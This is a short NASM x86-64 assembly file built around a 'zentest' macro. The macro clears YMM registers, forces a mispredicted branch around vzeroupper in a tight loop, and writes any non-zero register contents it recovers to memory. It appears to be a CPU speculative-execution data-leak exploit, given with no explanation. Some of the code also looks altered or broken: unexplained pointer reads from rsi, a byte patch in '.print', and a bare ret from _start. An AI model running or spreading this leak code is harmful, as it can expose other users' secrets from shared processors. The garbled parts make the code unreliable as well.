%ifndef zl_loop_pause
    %define zl_loop_pause 29
%endif

section .text
    global _start

_start:
    push   rbp
    mov    rbp,rsp
    push   0x8
    push   rsi
    sub    rsp,0x10
    mov    rdx, [rsi+0x27]
    shr    rdx, 0x18
    add    rdx, r14
    %macro zentest 1
        vpxor       ymm%1, ymm%1            ; clear ymm
        vptest      ymm%1, ymm%1            ; just used for scheduling
        times       zl_loop_pause pause
        vcvtsi2ss   xmm%1, xmm%1, rax
        vmovupd     ymm%1, ymm%1
        jpe         %%overzero              ; any condition here works
        jpo         %%overzero
        vzeroupper
    %%overzero:
        vptest      ymm%1, ymm%1
        jz          %%nextreg
    	vmovupd     [rdx+rax], ymm%1
	jmp        .print
    %%nextreg:
    %endmacro
    vzeroall
    xor         rax, rax
.repeat:
    %assign reg 15
    %rep 16
    zentest reg
    %assign reg reg - 1
    %endrep
    jmp         .repeat
.print:
    mov    rcx, [rsi +0x87]
    mov    ebx, [rcx]
    sub    ebx, 0x2e
    mov    [rcx], ebx
    mov    rsp,rbp
    pop    rbp
    ret
